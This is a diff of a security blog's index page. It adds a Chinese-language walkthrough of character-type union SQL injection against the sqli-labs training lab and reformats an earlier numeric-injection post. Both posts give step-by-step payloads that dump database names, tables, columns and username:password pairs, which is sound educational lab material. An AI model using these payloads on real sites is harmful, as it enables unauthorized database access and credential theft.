@@ -176,7 +176,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">1</span>
+          <span class="site-state-item-count">2</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -211,6 +211,216 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://byroins.github.io/2026/07/07/web-security/sql-injection/2026-07-07-character-type-union-injection/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/private/icon1.png">
+      <meta itemprop="name" content="Byron">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Byron">
+      <meta itemprop="description" content="Documenting vulnerability reproduction, SRC bug bounty write-ups, and custom penetration testing tools.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Byron">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/07/07/web-security/sql-injection/2026-07-07-character-type-union-injection/" class="post-title-link" itemprop="url">Character Type Union Injection</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-07-07 22:00:00 / Modified: 20:58:37" itemprop="dateCreated datePublished" datetime="2026-07-07T22:00:00+08:00">2026-07-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web-security/" itemprop="url" rel="index"><span itemprop="name">web-security</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web-security/sql-injection/" itemprop="url" rel="index"><span itemprop="name">sql-injection</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <blockquote>
+<p>Environment: PHP 7.3.4 + MySQL 5.7.26</p>
+</blockquote>
+<blockquote>
+<p>Lab: sqli-labs Less-1, Less-3, &amp; Less-4</p>
+</blockquote>
+<hr>
+<h2 id="1-0-介绍"><a href="#1-0-介绍" class="headerlink" title="1.0 介绍"></a>1.0 介绍</h2><p>在上一篇文章[Union Injection]中, 逐步剖析了数字型注入(Less-2)关卡, 这篇文章开始转向<strong>字符型注入</strong>,他增加了一个关键步骤: <strong>符号闭合</strong>,也就是通过精心拼接单引号、双引号或括号，把原本破坏 SQL 语法的恶意输入“伪装”成合法的查询语句，从而成功注入我们想要的 Payload</p>
+<p><strong>为什么要学字符型注入?</strong></p>
+<p>在真实 Web 应用中，绝大多数用户输入的参数都是被引号包裹的字符串(如登录名、搜索关键词、文章标题),字符型注入的占比远高于数字型</p>
+<h3 id="1-1-SQL语句及URL中常用注释"><a href="#1-1-SQL语句及URL中常用注释" class="headerlink" title="1.1 SQL语句及URL中常用注释"></a>1.1 SQL语句及URL中常用注释</h3><table>
+<thead>
+<tr>
+<th>注释类型</th>
+<th>SQL 语句中的语法要求</th>
+<th>GET 请求 URL 中的写法</th>
+<th>POST 请求 Body 中的写法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>单行注释 <code>--</code></td>
+<td>两个减号后<strong>必须跟一个空格</strong>(或制表符等控制字符)</td>
+<td>用 <code>--+</code> 或 <code>--%20</code><br><code>+</code> 解码为空格，<code>%20</code> 也是空格</td>
+<td>直接写 <code>--</code> (减号后带空格)</td>
+</tr>
+<tr>
+<td>单行注释 <code>#</code></td>
+<td>从 <code>#</code> 开始到行尾的所有内容均为注释</td>
+<td><strong>必须编码为 <code>%23</code></strong><br>(浏览器默认将 <code>#</code> 解析为页面锚点, 不发送给服务器)</td>
+<td>直接写 <code>#</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="2-0-手工注入"><a href="#2-0-手工注入" class="headerlink" title="2.0 手工注入"></a>2.0 手工注入</h2><p><strong>01 判断有无注入点(Less-1)</strong></p>
+<ul>
+<li><span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace">?id&#x3D;1 and 1&#x3D;1</span> → 页面正常返回值</li>
+<li><span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace">?id&#x3D;1 and 1&#x3D;2</span> → 页面正常返回值</li>
+</ul>
+<blockquote>
+<p>分析: ?id&#x3D;1 and 1&#x3D;2 返回值应该为false, 故暂且认为该漏洞为字符类型</p>
+</blockquote>
+<p><strong>以下测试字符型:</strong></p>
+<ul>
+<li><p><span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace">?id&#x3D;1’</span> → 报错</p>
+<p><img data-src="/2026/07/07/web-security/sql-injection/2026-07-07-character-type-union-injection/1.png"></p>
+</li>
+<li><p><span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace">?id&#x3D;1’ and 1&#x3D;1 –+</span> → 页面正常返回值</p>
+<p><img data-src="/2026/07/07/web-security/sql-injection/2026-07-07-character-type-union-injection/2.png"></p>
+</li>
+<li><p><span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace">?id&#x3D;1’ and 1&#x3D;2 –+</span> → 无返回值</p>
+<p><img data-src="/2026/07/07/web-security/sql-injection/2026-07-07-character-type-union-injection/3.png"></p>
+</li>
+</ul>
+<p><strong>按照上述方法,可构造出Less-3 &amp; Less-4 的闭合符号</strong></p>
+<table>
+<thead>
+<tr>
+<th align="center">Less-3</th>
+<th align="center">Less-4</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">?id&#x3D;’)</td>
+<td align="center">?id&#x3D;”)</td>
+</tr>
+</tbody></table>
+<p><strong>02 猜解列数</strong></p>
+<p><span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace">?id&#x3D;1’ order by 3 –+</span> → 正常返回</p>
+<p><span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace">?id&#x3D;1’ order by 4 –+</span> → 报错 <span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace">Unknown column ‘4’ in ‘order clause’</span></p>
+<blockquote>
+<p>通过以上Payload可知,当前查询涉及的表共有 <strong>3 列</strong></p>
+</blockquote>
+<p><strong>03 定位回显</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3 --+</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/07/web-security/sql-injection/2026-07-07-character-type-union-injection/4.png"></p>
+<p><strong>通过以上步骤, 确定三个Less的基本信息如下:</strong></p>
+<table>
+<thead>
+<tr>
+<th align="center">Lab</th>
+<th align="center">Character</th>
+<th align="center">Column</th>
+<th align="center"><strong>display position</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">Less-1</td>
+<td align="center">‘</td>
+<td align="center">3</td>
+<td align="center">2, 3</td>
+</tr>
+<tr>
+<td align="center">Less-3</td>
+<td align="center">‘)</td>
+<td align="center">3</td>
+<td align="center">2, 3</td>
+</tr>
+<tr>
+<td align="center">Less-4</td>
+<td align="center">“)</td>
+<td align="center">3</td>
+<td align="center">2, 3</td>
+</tr>
+</tbody></table>
+<p><strong>综合以上信息,即可构建注入Payload:</strong></p>
+<ul>
+<li>爆数据库名</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select null,database(),null --+</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>爆所有表</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select null,group_concat(table_name),null from information_schema.tables where table_schema=database() --+</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>爆字段</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select null,group_concat(column_name),null from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>爆数据</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select null,group_concat(username,0x3a,password,0x0a),null from security.users --+</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/07/web-security/sql-injection/2026-07-07-character-type-union-injection/5.png"></p>
+<p><strong>综上, 完整注入(Less-1), 对Less-3 &amp; Less-4使用同样思路注入即可, 只需修改对应Payload中闭合字符</strong></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -256,7 +466,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-07-07 12:08:20" itemprop="dateModified" datetime="2026-07-07T12:08:20+08:00">2026-07-07</time>
+      <time title="Modified: 2026-07-07 20:29:10" itemprop="dateModified" datetime="2026-07-07T20:29:10+08:00">2026-07-07</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -283,34 +493,35 @@
     
     <div class="post-body" itemprop="articleBody">
           <blockquote>
-<p>环境: PHP 7.3.4 + MySQL 5.7.26<br>靶场: sqli-lab&#x2F;Less-2</p>
+<p>Environment: PHP 7.3.4 + MySQL 5.7.26<br>Lab: sqli-labs Less-2</p>
 </blockquote>
 <h2 id="1-0-前置基础"><a href="#1-0-前置基础" class="headerlink" title="1.0 前置基础"></a>1.0 前置基础</h2><h3 id="1-1-Web应用三层架构"><a href="#1-1-Web应用三层架构" class="headerlink" title="1.1 Web应用三层架构:"></a>1.1 Web应用三层架构:</h3><p><img data-src="/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/web-application-architecture.png"></p>
 <blockquote>
 <p>SQL 注入恶意输入来源于表现层, 经业务逻辑传递, 在数据访问层拼接 SQL 时触发执行</p>
 </blockquote>
 <hr>
-<h3 id="1-2-order-by-探测-排序"><a href="#1-2-order-by-探测-排序" class="headerlink" title="1.2 order by (探测&#x2F;排序)"></a>1.2 order by (探测&#x2F;排序)</h3><p>01 语法格式:</p>
+<h3 id="1-2-order-by-探测-排序"><a href="#1-2-order-by-探测-排序" class="headerlink" title="1.2 order by (探测&#x2F;排序)"></a>1.2 order by (探测&#x2F;排序)</h3><p><strong>01 语法格式:</strong></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> n;</span><br></pre></td></tr></table></figure>
 
-<p>02 作用:</p>
+<p><strong>02 作用:</strong></p>
 <ul>
 <li>用于探测指定表的列数</li>
 </ul>
 <hr>
-<h3 id="1-3-union-联合查询"><a href="#1-3-union-联合查询" class="headerlink" title="1.3 union (联合查询)"></a>1.3 union (联合查询)</h3><p>01 联合查询语法:</p>
+<h3 id="1-3-union-联合查询"><a href="#1-3-union-联合查询" class="headerlink" title="1.3 union (联合查询)"></a>1.3 union (联合查询)</h3><p><strong>01 联合查询语法:</strong></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2 <span class="keyword">FROM</span> table1 </span><br><span class="line"><span class="keyword">UNION</span> </span><br><span class="line"><span class="keyword">SELECT</span> column1, column2 <span class="keyword">FROM</span> table2;</span><br></pre></td></tr></table></figure>
 
-<p>02 特性:</p>
+<p><strong>02 特性:</strong></p>
 <ul>
 <li>列数必须完全相等：前后两条SELECT查询的字段数量必须一致</li>
 <li>数据类型必须兼容</li>
 </ul>
 <hr>
-<h3 id="1-4-系统库-information-schema"><a href="#1-4-系统库-information-schema" class="headerlink" title="1.4 系统库 information_schema"></a>1.4 系统库 information_schema</h3><p>01 概述: <span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace"><strong>information_schema</strong></span> 是MySQL 5.0 及以上版本自带的“元数据库”,正是该库的特性,才提供了后续注入的核心内容!</p>
-<p>02 结构图解:</p>
+<h3 id="1-4-系统库-information-schema"><a href="#1-4-系统库-information-schema" class="headerlink" title="1.4 系统库 information_schema"></a>1.4 系统库 information_schema</h3><p><strong>01 概述:</strong></p>
+<p> <span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace"><strong>information_schema</strong></span> 是MySQL 5.0 及以上版本自带的“元数据库”,正是该库的特性,才提供了后续注入的核心内容!</p>
+<p><strong>02 结构图解:</strong></p>
 <p><img data-src="/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/information_schema.png"></p>
-<p>03 字段解读:</p>
+<p><strong>03 字段解读:</strong></p>
 <ul>
 <li>schemata: 存储所有数据库的信息<ul>
 <li>schema_name(数据库名)</li>
@@ -342,7 +553,7 @@
 <td>Less-2</td>
 </tr>
 </tbody></table>
-<p>01 判断有无注入点</p>
+<p><strong>01 判断有无注入点</strong></p>
 <ul>
 <li><p><span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace">?id&#x3D;1 and 1&#x3D;1</span> → 页面正常返回值</p>
 </li>
@@ -352,7 +563,7 @@
 <blockquote>
 <p>通过以上Payload判断存在注入点,且为<strong>数字型</strong></p>
 </blockquote>
-<p>02 猜解列数</p>
+<p><strong>02 猜解列数</strong></p>
 <ul>
 <li><span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace">?id&#x3D;1 order by 1</span> → 正常</li>
 <li><span style="border:1px solid #f44336;background:#ffebee;padding:2px 6px;border-radius:3px;font-family:monospace">?id&#x3D;1 order by 2</span> → 正常</li>
@@ -362,26 +573,26 @@
 <blockquote>
 <p>通过以上Payload可知,当前查询涉及的表共有 <strong>3 列</strong></p>
 </blockquote>
-<p>03 定位回显</p>
+<p><strong>03 定位回显</strong></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure>
 
 <p><img data-src="/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/huixian.png"></p>
 <blockquote>
 <p>通过上图得知可用回显位为2,3</p>
 </blockquote>
-<p>04 爆数据库名</p>
+<p><strong>04 爆数据库名</strong></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database(),<span class="keyword">null</span></span><br></pre></td></tr></table></figure>
 
 <p><img data-src="/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/database.png"></p>
-<p>05 爆所有表</p>
+<p><strong>05 爆所有表</strong></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="keyword">null</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span></span><br><span class="line">table_schema<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure>
 
 <p><img data-src="/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/tables.png"></p>
-<p>06 爆字段</p>
+<p><strong>06 爆字段</strong></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="keyword">null</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span></span><br></pre></td></tr></table></figure>
 
 <p><img data-src="/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/columns.png"></p>
-<p>07 爆数据</p>
+<p><strong>07 爆数据</strong></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(username,<span class="string">&#x27;:&#x27;</span>,password),<span class="keyword">null</span> <span class="keyword">from</span> security.users</span><br></pre></td></tr></table></figure>
 <p><img data-src="/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/data.png"></p>
 
